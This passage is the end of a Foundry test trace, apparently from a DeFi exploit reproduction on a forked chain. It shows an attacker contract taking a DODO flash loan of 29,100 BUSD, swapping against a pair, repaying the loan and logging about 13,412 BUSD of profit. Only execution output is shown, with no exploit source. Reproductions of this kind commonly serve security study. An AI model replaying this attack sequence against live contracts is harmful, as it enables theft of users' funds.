    │   │   │   ├─ emit Sync(reserve0: 49856974664849149620683 [4.985e22], reserve1: 16853447463425321168437 [1.685e22])
    │   │   │   ├─ emit Swap(sender: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 49167128875493435883933 [4.916e22], amount1In: 0, amount0Out: 0, amount1Out: 42512363310180390856151 [4.251e22], to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3271] BUSD::transfer(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], 29100000000000000000000 [2.91e22])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], value: 29100000000000000000000 [2.91e22])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 74515087607638180967 [7.451e19]
    │   ├─ [531] BUSD::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 592676457339308279189968 [5.926e23]
    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 74515087607638180967 [7.451e19]
    │   ├─ [531] BUSD::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 592676457339308279189968 [5.926e23]
    │   ├─ emit DODOFlashLoan(: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 29100000000000000000000 [2.91e22])
    │   └─ ← [Stop] 
    ├─ [531] BUSD::balanceOf(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 13412363310180390856151 [1.341e22]
    ├─ [425] BUSD::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker BUSD balance after attack", val: 13412363310180390856151 [1.341e22], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 365.20ms (3.60ms CPU time)

Ran 2 test suites in 630.39ms (678.58ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
